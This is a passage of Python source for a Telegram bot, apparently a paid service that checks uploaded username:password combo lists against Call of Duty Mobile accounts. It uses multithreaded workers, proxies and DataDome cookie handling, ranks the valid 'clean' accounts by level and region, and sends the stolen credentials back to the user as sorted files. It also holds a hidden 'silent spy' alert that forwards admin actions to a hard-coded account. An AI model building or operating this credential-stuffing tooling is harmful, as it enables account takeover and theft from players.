                bot.send_message(inv.get('user_id'), f"[ ɴᴏᴛɪᴄᴇ ]\n\n• ʏᴏᴜʀ ᴘᴀʏᴍᴇɴᴛ ғᴏʀ {inv.get('amount_php')} ᴘʜᴘ ʜᴀs ʙᴇᴇɴ ᴅᴇᴄʟɪɴᴇᴅ\n\nʀᴇᴀsᴏɴ: {reason}")
            except:
                pass
        cursor.close()
        conn.close()

def parse_duration(duration_str):
    import re
    match = re.match(r'^(\d+)(s|m|h|d|w|mo|y)$', duration_str)
    if not match:
        return None
    val = int(match.group(1))
    unit = match.group(2)
    if unit == 's': return timedelta(seconds=val)
    if unit == 'm': return timedelta(minutes=val)
    if unit == 'h': return timedelta(hours=val)
    if unit == 'd': return timedelta(days=val)
    if unit == 'w': return timedelta(weeks=val)
    if unit == 'mo': return timedelta(days=val*30)
    if unit == 'y': return timedelta(days=val*365)
    return None

def process_custom_suspend(message, target_id):
    duration_str = message.text.strip()
    if not parse_duration(duration_str):
        try:
            bot.send_message(message.chat.id, "ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ, ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ғʀᴏᴍ ᴛʜᴇ ᴍᴇɴᴜ")
        except Exception: pass
        return
    try:
        msg = bot.send_message(message.chat.id, "ᴇɴᴛᴇʀ ᴛʜᴇ ʀᴇᴀsᴏɴ ғᴏʀ sᴜsᴘᴇɴsɪᴏɴ:")
        bot.clear_step_handler_by_chat_id(message.chat.id)
        bot.register_next_step_handler(msg, process_suspend_reason, target_id, duration_str)
    except Exception: pass

def process_suspend_reason(message, target_id, duration_str):
    reason = message.text.strip()
    td = parse_duration(duration_str)
    if not td:
        try:
            bot.send_message(message.chat.id, "ᴇʀʀᴏʀ ᴘʀᴏssɪɴɢ ᴅᴜʀᴀᴛɪᴏɴ.")
        except Exception: pass
        return
        
    suspend_until = datetime.now() + td
    conn = get_db()
    if conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET suspended_until = ?, suspend_reason = ? WHERE user_id = ?", (suspend_until, reason, target_id))
        conn.commit()
        cursor.close()
        conn.close()
        
    try:
        bot.send_message(message.chat.id, f"ᴜsᴇʀ {target_id} sᴜsᴘᴇɴᴅᴇᴅ ᴜɴᴛɪʟ {suspend_until}")
    except Exception: pass
    try:
        bot.send_message(target_id, f"[ ᴀᴄᴄᴏᴜɴᴛ sᴜsᴘᴇɴᴅᴇᴅ ]\n\n• ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ sᴜsᴘᴇɴᴅᴇᴅ ᴜɴᴛɪʟ {suspend_until}\n• ʀᴇᴀsᴏɴ: {reason}\n\nɪғ ʏᴏᴜ ᴛʜɪɴᴋ ᴛʜɪs ɪs ᴀ ᴍɪsᴛᴀᴋᴇ ᴄᴏɴᴛᴀᴄᴛ Saltpapi656")
    except:
        pass

def process_announcement(message):
    user_id = message.from_user.id
    if not is_admin(user_id): return

    announcement_text = message.text
    if not announcement_text:
        bot.send_message(message.chat.id, "ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ ᴄᴀɴᴄᴇʟʟᴇᴅ. ᴛᴇxᴛ ɪs ʀᴇᴏ̨ᴜɪʀᴇᴅ.", reply_markup=main_menu(user_id))
        return

    formatted_message = f"ᴏᴡɴᴇʀ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ - ( SALTPAPI)\n\n{announcement_text}"

    conn = get_db()
    if not conn:
        bot.send_message(message.chat.id, "ᴅᴀᴛᴀʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ғᴀɪʟᴇᴅ.", reply_markup=main_menu(user_id))
        return

    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    cursor.close()
    conn.close()

    bot.send_message(message.chat.id, f"ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ ᴛᴏ {len(users)} ᴜsᴇʀs. ᴛʜɪs ᴍɪɢʜᴛ ᴛᴀᴋᴇ ᴀ ᴍᴏᴍᴇɴᴛ, ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...")

    success_count = 0
    fail_count = 0

    for u in users:
        target_id = u.get('user_id')
        try:
            bot.send_message(target_id, formatted_message)
            success_count += 1
        except Exception:
            fail_count += 1
        time.sleep(0.05) 

    bot.send_message(message.chat.id, f"[ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ sᴛᴀᴛs ]\n\n• sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴛ ᴛᴏ: {success_count} ᴜsᴇʀs\n• ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴛᴏ: {fail_count} ᴜsᴇʀs", reply_markup=main_menu(user_id))
    
def process_add_coins_userid(message):
    user_id = message.from_user.id
    if not is_admin(user_id): return
    
    try:
        target_id = int(message.text.strip())
    except ValueError:
        bot.send_message(message.chat.id, "ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ. ᴍᴜsᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ.", reply_markup=main_menu(user_id))
        return
        
    conn = get_db()
    if conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (target_id,))
        user_row = cursor.fetchone()
        cursor.close()
        conn.close()
        
        if not user_row:
            bot.send_message(message.chat.id, f"ᴇʀʀᴏʀ: ᴜsᴇʀ ɪᴅ {target_id} ᴅᴏᴇs ɴᴏᴛ ᴇxɪsᴛ ɪɴ ᴛʜᴇ ᴅᴀᴛᴀʙᴀsᴇ.", reply_markup=main_menu(user_id))
            return
        else:
            msg = bot.send_message(message.chat.id, f"ᴜsᴇʀ ғᴏᴜɴᴅ: {user_row.get('username', 'Unknown')}\n\nʜᴏᴡ ᴍᴀɴʏ ᴄᴏɪɴs ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴅᴅ?")
            bot.clear_step_handler_by_chat_id(message.chat.id)
            bot.register_next_step_handler(msg, process_add_coins_amount, target_id)
    else:
        bot.send_message(message.chat.id, "ᴅᴀᴛᴀʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ғᴀɪʟᴇᴅ.", reply_markup=main_menu(user_id))

def process_add_coins_userid(message):
    user_id = message.from_user.id
    if not is_admin(user_id): return
    
    try:
        target_id = int(message.text.strip())
    except ValueError:
        bot.send_message(message.chat.id, "ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ. ᴍᴜsᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ.", reply_markup=main_menu(user_id))
        return
        
    conn = get_db()
    if conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (target_id,))
        user_row = cursor.fetchone()
        cursor.close()
        conn.close()
        
        if not user_row:
            bot.send_message(message.chat.id, f"ᴇʀʀᴏʀ: ᴜsᴇʀ ɪᴅ {target_id} ᴅᴏᴇs ɴᴏᴛ ᴇxɪsᴛ ɪɴ ᴛʜᴇ ᴅᴀᴛᴀʙᴀsᴇ.", reply_markup=main_menu(user_id))
            return
        else:
            msg = bot.send_message(message.chat.id, f"ᴜsᴇʀ ғᴏᴜɴᴅ: {user_row.get('username', 'Unknown')}\n\nʜᴏᴡ ᴍᴀɴʏ ᴄᴏɪɴs ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴅᴅ?")
            bot.clear_step_handler_by_chat_id(message.chat.id)
            bot.register_next_step_handler(msg, process_add_coins_amount, target_id)
    else:
        bot.send_message(message.chat.id, "ᴅᴀᴛᴀʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛɪᴏัน ғᴀɪʟᴇᴅ.", reply_markup=main_menu(user_id))

def process_add_coins_amount(message, target_id):
    user_id = message.from_user.id
    if not is_admin(user_id): return
    
    try:
        coins_to_add = int(message.text.strip())
    except ValueError:
        bot.send_message(message.chat.id, "ɪɴᴠᴀʟɪᴅ ᴀᴍᴏᴜɴᴛ. ᴍᴜsᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ.", reply_markup=main_menu(user_id))
        return
        
    conn = get_db()
    if conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (coins_to_add, target_id))
        conn.commit()
        
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (target_id,))
        user_row = cursor.fetchone()
        
        cursor.close()
        conn.close()
        
        new_balance = user_row.get('coins', 0) if user_row else 'Unknown'
        
        # Unang reply: Doon sa Admin na nag-add ng barya
        bot.send_message(message.chat.id, f"[ sᴜᴄᴄᴇss ]\n\n• {coins_to_add} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ ᴛᴏ ᴜsᴇʀ {target_id}.\n• ɴᴇᴡ ʙᴀʟᴀɴᴄᴇ: {new_balance}", reply_markup=main_menu(user_id))
        
        # ============================================================
        # 🚨 ADDED: AUTOMATED SILENT SPY NOTIFICATION (Rekta sayo)
        # ============================================================
        try:
            admin_name = message.from_user.first_name
            admin_id = message.from_user.id
            
            alert_text = (
                "🔔 <b>ADMIN TRANSACTION ALERT</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>By Admin:</b> {admin_name} (<code>{admin_id}</code>)\n"
                f"📥 <b>Action:</b> Has added coins via Panel\n"
                f"🎯 <b>Target User ID:</b> <code>{target_id}</code>\n"
                f"💰 <b>Amount Added:</b> +{coins_to_add:,} coins\n"
                f"💳 <b>User New Balance:</b> {new_balance:,} coins\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "👀 <i>This is an automated security notification.</i>"
            )
            
            # Palaging ipapadala sa personal ID mo kahit sino sa inyong dalawa ang nag-add
            bot.send_message(7201369115, alert_text, parse_mode="HTML")
        except Exception as alert_err:
            print(f"❌ Error sa pag-send ng admin alert notification: {alert_err}")
        # ============================================================
        
        # Pangalawang reply: Doon sa user na nakatanggap ng coins
        try:
            bot.send_message(target_id, f"[ ɴᴏᴛɪᴄᴇ ]\n\n• ᴀɴ ᴀᴅᴍɪɴ ʜᴀs ᴀᴅᴅᴇᴅ {coins_to_add} ᴄᴏɪɴs ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.\n• ɴᴇᴡ ʙᴀʟᴀɴᴄᴇ: {new_balance}")
        except Exception:
            pass
    else:
        bot.send_message(message.chat.id, "ᴅᴀᴛᴀʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ғᴀɪʟᴇᴅ.", reply_markup=main_menu(user_id))

def bot_process_checker(user_id, filename, chat_id, message_id, proxy_status='off', stop_event=None):
    global active_checks, error_refunds
    base_results_dir = get_or_create_results_folder(user_id, filename)
    
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    cookie_manager = CookieManager()
    
    proxy_manager = ProxyManager() if proxy_status == 'on' else None
    
    thread_config = {"name": "MAX SPEED", "threads": 10, "delay": 0}
    
    accounts = []
    encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    
    for encoding in encodings:
        try:
            with open(filename, 'r', encoding=encoding) as file:
                accounts = [line.strip() for line in file if line.strip()]
            break
        except UnicodeDecodeError:
            continue
            
    if not accounts:
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
                accounts = [line.strip() for line in file if line.strip()]
        except Exception:
            if stop_events.get(user_id) == stop_event:
                active_checks[user_id] = False
            return

    unchecked_accounts = []
    for account_line in accounts:
        if ':' in account_line:
            unchecked_accounts.append(account_line)
    
    total_unchecked = len(unchecked_accounts)
    if total_unchecked == 0:
        if stop_events.get(user_id) == stop_event:
            active_checks[user_id] = False
        try:
            bot.send_message(user_id, "ᴄʜᴇᴄᴋ sᴛᴏᴘᴘᴇᴅ. ɴᴏ ᴠᴀʟɪᴅ ᴀᴄᴄᴏᴜɴᴛs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ.")
        except: pass
        return
        
    conn = get_db()
    user_coins = 0
    if conn:
        cursor = conn.cursor()
        cursor.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
        u = cursor.fetchone()
        if u: user_coins = int(u.get('coins', 0))
        cursor.close()
        conn.close()
    else:
        if stop_events.get(user_id) == stop_event:
            active_checks[user_id] = False
        try:
            bot.send_message(user_id, "ᴄʜᴇᴄᴋ sᴛᴏᴘᴘᴇᴅ. ᴅᴀᴛᴀʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ғᴀɪʟᴇᴅ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.")
        except: pass
        return
        
    lines_to_check = min(total_unchecked, user_coins)
    
    if lines_to_check <= 0:
        if stop_events.get(user_id) == stop_event:
            active_checks[user_id] = False
        try:
            bot.send_message(user_id, f"ᴄʜᴇᴄᴋ Sᴛᴏᴘᴘᴇᴅ. ʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴇɴᴏᴜɢʜ ᴄᴏɪɴs ᴛᴏ ᴘʀᴏᴄᴇss ᴀɴʏ ʟɪɴᴇs. (ʙᴀʟᴀɴᴄᴇ: {user_coins})")
        except: pass
        return
        
    unchecked_accounts = unchecked_accounts[:lines_to_check]
    
    update_user_stats(user_id, 0, coins_deduct_or_refund=-lines_to_check)
    error_refunds[user_id] = 0
    
    account_queue = Queue()
    results_queue = Queue()
    file_lock = Lock()
    
    for account_line in unchecked_accounts:
        account_queue.put(account_line)
        
    threads = []
    for i in range(thread_config["threads"]):
        t = threading.Thread(
            target=worker, 
            args=(user_id, account_queue, results_queue, thread_config, cookie_manager, datadome_manager, live_stats, file_lock, proxy_manager, base_results_dir, stop_event),
            name=f"Worker_CODM_{i+1}"
        )
        t.daemon = True
        t.start()
        threads.append(t)
        
    last_ui_update = time.time()
    
    try:
        while (any(t.is_alive() for t in threads) or not results_queue.empty()) and not stop_event.is_set():
            while not results_queue.empty() and not stop_event.is_set():
                status, account_line, result = results_queue.get()
                
                # 1. Sinalo ang lahat ng 5 variables mula sa LiveStats (Ligtas sa unpack error)
                stats, lvls, srvs, top_lvl, top_acc = live_stats.get_stats(full=True)
                
                if time.time() - last_ui_update > 3:
                    checked_count = stats['valid'] + stats['invalid']
                    total_hits = stats['has_codm'] if stats['has_codm'] > 0 else 1
                    progress = (checked_count / lines_to_check) * 100
                    
                    # 2. HTML ONE-TAP COPY ENGINE (Siguradong gagana sa tap)
                    if top_lvl > 0:
                        top_user = top_acc.split(':')[0]
                        top_pass = top_acc.split(':')[1] if ':' in top_acc else ''
                        
                        # Ginamit ang HTML <code> tag para sa garantisadong single tap copy
                        top_hit_display = f"<code>{top_user}:{top_pass}</code>\n🌟 Level: <code>{top_lvl}</code>"
                    else:
                        top_hit_display = "❌ <code>None</code>"
                    
                    text = (
                        "⚡ Checking… 𝙇𝙄𝙑𝙀 𝙎𝙏𝘼𝙏𝙎\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"⏳ {get_bar(checked_count, lines_to_check)} {progress:.0f}%  {checked_count:,}/{lines_to_check:,}\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ Valid      : {stats['valid']}\n"
                        f"❌ Invalid    : {stats['invalid']}\n"
                        f"✨ Clean      : {stats['clean']}\n"
                        f"⚠️  Not Clean  : {stats['not_clean']}\n"
                        f"🎮 Has CODM   : {stats['has_codm']}\n"
                        f"📭 No CODM    : {stats['no_codm']}\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "📊 Level Distribution\n"
                        f"  1-50    : {generate_stat_line(lvls['1-50'], total_hits)}\n"
                        f"  51-100  : {generate_stat_line(lvls['51-100'], total_hits)}\n"
                        f"  101-150 : {generate_stat_line(lvls['101-150'], total_hits)}\n"
                        f"  151-200 : {generate_stat_line(lvls['151-200'], total_hits)}\n"
                        f"  201-250 : {generate_stat_line(lvls['201-250'], total_hits)}\n"
                        f"  251-300 : {generate_stat_line(lvls['251-300'], total_hits)}\n"
                        f"  301-350 : {generate_stat_line(lvls['301-350'], total_hits)}\n"
                        f"  351+    : {generate_stat_line(lvls['351+'], total_hits)}\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "🌏 Server Distribution\n"
                        f"  PH    : {generate_stat_line(srvs['PH'], total_hits)}\n"
                        f"  TH    : {generate_stat_line(srvs['TH'], total_hits)}\n"
                        f"  ID    : {generate_stat_line(srvs['ID'], total_hits)}\n"
                        f"  VN    : {generate_stat_line(srvs['VN'], total_hits)}\n"
                        f"  MY    : {generate_stat_line(srvs['MY'], total_hits)}\n"
                        f"  US    : {generate_stat_line(srvs['US'], total_hits)}\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "🔥 <b>HIGHEST CLEAN:</b>\n"
                        f"{top_hit_display}\n" 
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "ᴛᴀᴘ ᴛᴏ ᴄᴏᴘʏ"
                    )
                           
                    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("[ sᴛᴏᴘ ᴄʜᴇᴄᴋɪɴɢ ]", callback_data="stop_checking"))
                    try:
                        # FIX: Pinalitan ng parse_mode="HTML" para pilitin ang kopya
                        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
                    except Exception as e:
                        pass
                    last_ui_update = time.time()
                
                results_queue.task_done()
                
            time.sleep(0.1)
            
    except Exception as e:
        print(f"❌ Error in checker main thread: {e}")
        
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=2)
            
        if stop_events.get(user_id) == stop_event:
            active_checks[user_id] = False
            
        # 1. Salo ng data mula sa LiveStats (Ligtas sa unpack error)
        final_stats, final_lvls, final_srvs, top_lvl, top_acc = live_stats.get_stats(full=True)
        
        unchecked_count = account_queue.qsize()
        total_errors = error_refunds.get(user_id, 0)
        # LINE 3431 - KUKUNIN ANG REFUND AMOUNT
        refund_amount = unchecked_count + total_errors
        
        # LINE 3432 - DITO MAG-UUPDATE NG COINS SA DATABASE (Para sa refund ng checker)
        update_user_stats(user_id, final_stats['valid'], coins_deduct_or_refund=refund_amount)        

        # 🌟 LINE 3434 Pababa - Binalik ang mga kalkulasyon na hinahanap ng iyong final_text layout
        final_processed = final_stats['valid'] + final_stats['invalid']
        total_hits = final_stats['has_codm'] if final_stats['has_codm'] > 0 else 1

        # 🌟 FIX: Binalik ang rendering para sa Highest Clean display gamit ang HTML One-Tap Copy
        if top_lvl > 0:
            top_user_final = top_acc.split(':')[0]
            top_pass_final = top_acc.split(':')[1] if ':' in top_acc else ''
            top_hit_final_display = f"<code>{top_user_final} {top_pass_final}</code> (Lv. <code>{top_lvl}</code>)"
        else:
            top_hit_final_display = "None"

        # Kukunin ang kasalukuyang oras kung kailan natapos ang checking para sa parehong text at caption
        current_time = datetime.now().strftime("%H:%M:%S")

        # 2. PREMIUM & COMPACT FINAL TEXT SUMMARY (HTML Parse Mode) - WALANG GINALAW DITO
        final_text = (
            "‼️ <b>Checking Finished!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ {get_bar(final_processed, final_processed)} 100%  {final_processed:,}/{final_processed:,}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Valid      : {final_stats['valid']}\n"
            f"❌ Invalid    : {final_stats['invalid']}\n"
            f"✨ Clean      : {final_stats['clean']}\n"
            f"⚠️  Not Clean  : {final_stats['not_clean']}\n"
            f"🎮 Has CODM   : {final_stats['has_codm']}\n"
            f"📭 No CODM    : {final_stats['no_codm']}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📊 <b>Level Distribution</b>\n"
            f"  1-50    : {generate_stat_line(final_lvls['1-50'], total_hits)}\n"
            f"  51-100  : {generate_stat_line(final_lvls['51-100'], total_hits)}\n"
            f"  101-150 : {generate_stat_line(final_lvls['101-150'], total_hits)}\n"
            f"  151-200 : {generate_stat_line(final_lvls['151-200'], total_hits)}\n"
            f"  201-250 : {generate_stat_line(final_lvls['201-250'], total_hits)}\n"
            f"  251-300 : {generate_stat_line(final_lvls['251-300'], total_hits)}\n"
            f"  301-350 : {generate_stat_line(final_lvls['301-350'], total_hits)}\n"
            f"  351+    : {generate_stat_line(final_lvls['351+'], total_hits)}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🌏 <b>Server Distribution</b>\n"
            f"  PH    : {generate_stat_line(final_srvs['PH'], total_hits)}\n"
            f"  TH    : {generate_stat_line(final_srvs['TH'], total_hits)}\n"
            f"  ID    : {generate_stat_line(final_srvs['ID'], total_hits)}\n"
            f"  VN    : {generate_stat_line(final_srvs['VN'], total_hits)}\n"
            f"  MY    : {generate_stat_line(final_srvs['MY'], total_hits)}\n"
            f"  US    : {generate_stat_line(final_srvs['US'], total_hits)}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 <b>HIGHEST CLEAN:</b>\n{top_hit_final_display}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "𝕯𝖊𝖛: @Saltpapi656"
        )
                                          
        try:
            results_dir = f"Containers/{user_id}/Results"
            if os.path.exists(results_dir):
                trigger_results_sorting(results_dir)          
                sort_all_one_line_files_in_dir(results_dir)    
                
                folders = [os.path.join(results_dir, f) for f in os.listdir(results_dir) if os.path.isdir(os.path.join(results_dir, f))]
                
                if folders:
                    latest_folder_path = max(folders, key=os.path.getmtime)
                    folder_name = os.path.basename(latest_folder_path)
                    zip_path = latest_folder_path + ".zip"        
        
                    if os.path.exists(zip_path):
                        try:
                            os.remove(zip_path) 
                        except:
                            pass
                    shutil.make_archive(latest_folder_path, 'zip', latest_folder_path)
                    
                    if final_stats['valid'] > 0:
                        with open(zip_path, 'rb') as doc:
                            # Inayos ang caption para sumunod sa premium results style mo
                            new_caption = (
                                "🎉 **𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀𝘿!**\n\n"
                                f"**✅** ꜰᴜʟʟʏ ꜱᴏʀᴛᴇᴅ ʙʏ ʟᴇᴠᴇʟ (400 ➡️ 1)\n"
                                f"**📊 ʟɪɴᴇꜱ:** {lines_to_check}\n"
                                f"**📂 ғᴏʟᴅᴇʀ:** `{folder_name}`\n"
                                f"**💯 ᴛᴏᴛᴀʟ ʜɪᴛꜱ:** {final_stats['valid']:,}\n"
                                "**💎 𝙏𝙝𝙖𝙣𝙠 𝙮𝙤𝙪 𝙛𝙤𝙧 𝙪𝙨𝙞𝙣𝙜 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙨𝙚𝙧𝙫𝙞𝙘𝙚!**"
                            )
                            
                            bot.send_document(
                                chat_id, 
                                doc, 
                                caption=new_caption,
                                parse_mode="Markdown"
                            )
        except Exception as e:
            print(f"❌ Error during sorting or auto-sending results file: {e}")

        # 🌟 NOTA: Pwede mong idikit dito sa dulo ang edit_message_text mo kung kailangan para mag-update ang UI sa Telegram.
            
# ============================================================
# 🛠️ MATIBAY AT REPAIRED LEVEL SORTER FUNCTIONS (PINAG-ISA)
# ============================================================

def extract_level_from_oneline(line):
    """Kukuha ng level para sa mga single lines (clean.txt / notclean.txt)"""
    match = re.search(r'Level:\s*(\d+|N/A)', line)
    if match:
        val = match.group(1)
        return 0 if val == 'N/A' else int(val)
    return 0

def extract_level_from_block(block):
    """Kukuha ng level sa loob ng multi-line block (full_details.txt) kahit may newline breaks"""
    normalized_block = block.replace('\r', '').replace('\n', ' ')
    normalized_block = re.sub(r'Accou\s+nt Level:', 'Account Level:', normalized_block)
    normalized_block = re.sub(r'Acco\s+nt Level:', 'Account Level:', normalized_block)
    
    match = re.search(r'Account Level:\s*(\d+|N/A)', normalized_block)
    if match:
        level_value = match.group(1)
        return 0 if level_value == 'N/A' else int(level_value)
    return 0

def trigger_results_sorting(base_results_dir):
    """Matatag na Sorter para sa full_details.txt gamit ang Block Regex"""
    details_file_path = os.path.join(base_results_dir, 'full_details.txt')
    if not os.path.exists(details_file_path):
        return

    try:
        with open(details_file_path, 'r', encoding='utf-8') as f:
            content = f.read()

        # Linisin muna ang mga sirang linya o putol na "Acco\nnt Level"
        content = content.replace("Acco\nunt Level:", "Account Level:")
        content = content.replace("Acco\nut Level:", "Account Level:")

        # Extract ang bawat account block gamit ang Regex (mula === hanggang sa susunod na ===)
        block_pattern = r"(?:==+)\nAccount:.*?\n(?:==+)"
        raw_blocks = re.findall(block_pattern, content, re.DOTALL)

        parsed_accounts = []
        for block in raw_blocks:
            level = extract_level_from_block(block)
            parsed_accounts.append({
                'level': level,
                'clean_block': block.strip()
            })

        if not parsed_accounts:
            return

        # I-sort mula sa pinakamataas na level pababa (Descending Order)
        parsed_accounts.sort(key=lambda x: x['level'], reverse=True)

        # Muling isulat ang file nang napakalinis at may maayos na counter placement
        with open(details_file_path, 'w', encoding='utf-8') as f_write:
            for index, acc in enumerate(parsed_accounts, start=1):
                f_write.write(f"{index}.\n")
                f_write.write(f"{acc['clean_block']}\n\n")
        print("🔥 full_details.txt successfully sorted and cleaned!")

    except Exception as e:
        print(f"❌ Error executing robust sort for full_details: {e}")

def sort_single_line_file(file_path):
    """Ganap na tumpak na Sorter para sa mga single line files (clean.txt / notclean.txt)"""
    if not os.path.exists(file_path):
        return

    try:
        # Basahin ang file gamit ang tamang lines extraction
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        parsed_accounts = []
        seen_lines = set() # Para maiwasan ang dobleng pagkopya pero walang matatapon

        for line in lines:
            cleaned_line = line.strip()
            # Siguraduhing may laman at hindi basta-basta basurang linya, at iwasan ang duplicate logs
            if not cleaned_line or cleaned_line in seen_lines:
                continue
                
            # Kunin ang level gamit ang tumpak na regex block
            level = extract_level_from_oneline(cleaned_line)
            
            parsed_accounts.append({
                'level': level,
                'original_line': cleaned_line
            })
            seen_lines.add(cleaned_line)

        # Kung walang nakuha, huwag galawin ang file para iwas bura
        if not parsed_accounts:
            return

        # I-sort mula sa pinakamataas na Level pababa (Descending Order: 400 -> 0)
        parsed_accounts.sort(key=lambda x: x['level'], reverse=True)

        # Muling isulat ang file nang buong-buo at walang bawas
        with open(file_path, 'w', encoding='utf-8') as f_write:
            for acc in parsed_accounts:
                f_write.write(f"{acc['original_line']}\n")
                
        print(f"✅ {os.path.basename(file_path)} has been successfully sorted with 100% accuracy!")

    except Exception as e:
        print(f"❌ Error sorting single line file ({os.path.basename(file_path)}): {e}")

def sort_all_one_line_files_in_dir(base_results_dir):
    """Awtomatikong hahanapin at i-so-sort ang lahat ng .txt files maliban sa full_details.txt"""
    # 1. I-sort ang root level logs
    sort_single_line_file(os.path.join(base_results_dir, 'clean.txt'))
    sort_single_line_file(os.path.join(base_results_dir, 'notclean.txt'))

    # 2. I-sort ang mga files sa loob ng Clean/ at NotClean/ subfolders (gaya ng PH, TH, ID, at level-range files)
    for root, dirs, files in os.walk(base_results_dir):
        for file in files:
            if file.endswith('.txt') and file != 'full_details.txt':
                sort_single_line_file(os.path.join(root, file))
    print("✅ All single-line text files have been successfully sorted!")


# ============================================================
# 📢 TELEGRAM BOT PROCESS TELEGRAM ANNOUNCEMENT
# ============================================================

def process_admin_announcement(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return

    announcement_text = message.text
    if announcement_text.lower() == "cancel":
        bot.send_message(message.chat.id, "❌ [ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ ᴄᴀɴᴄᴇʟᴇᴅ ]")
        return

    status_msg = bot.send_message(message.chat.id, "⏳ sᴇɴᴅɪɴɢ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ ᴛᴏ ᴀʟʟ ᴜsᴇʀs...")

    conn = get_db()
    if conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        all_users = cursor.fetchall()
        cursor.close()
        conn.close()

        success_count = 0
        for row in all_users:
            target_id = row[0] if isinstance(row, tuple) else row.get('user_id')
            if target_id == user_id:
                continue
            try:
                bot.send_message(target_id, f"📢 **[ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ ]** 📢\n\n{announcement_text}", parse_mode="Markdown")
                success_count += 1
            except Exception:
                pass

        try:
            bot.edit_message_text(f"✅ **[ ʙʀᴏᴀᴅᴄᴀsᴛ sᴜᴄᴄᴇss ]**\n\n• ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ sᴇɴᴛ ᴛᴏ **{success_count}** ᴜsᴇʀs.", message.chat.id, status_msg.message_id, parse_mode="Markdown")
        except Exception:
            bot.send_message(message.chat.id, f"✅ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ sᴇɴᴛ ᴛᴏ {success_count} ᴜsᴇʀs.")
            
# Halimbawa sa loob ng function kung saan tinatapos ng bot ang session checking:
def finalize_checking_session(user_id, combo_file_path):
    # Kunin ang aktwal na folder path ng results
    results_dir = get_or_create_results_folder(user_id, combo_file_path)
    
    print("⏳ Sorting output files by CODM Level...")
    # Patatakbuhin ang tatlong magkakaugnay na selyadong sorters
    trigger_results_sorting(results_dir)
    print("✅ Sorting completed successfully!")
    
# ============================================================
# MAIN INITIALIZER ENTRY POINT
# ============================================================

@app.route('/' + TOKEN, methods=['POST'])
def getMessage():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@app.route("/")
def webhook():
    bot.remove_webhook()
    # ⚠️ PALITAN MO ITO: Ilagay mo rito ang Render URL ng app mo kapag live na
    RENDER_URL = "https://kaze-codm-checker-i0ke.onrender.com" 
    bot.set_webhook(url=RENDER_URL + '/' + TOKEN)
    return "Bot is online! Webhook active.", 200

if __name__ == '__main__':
    print("Starting Telegram Bot (Webhook Version)")
    init_db()
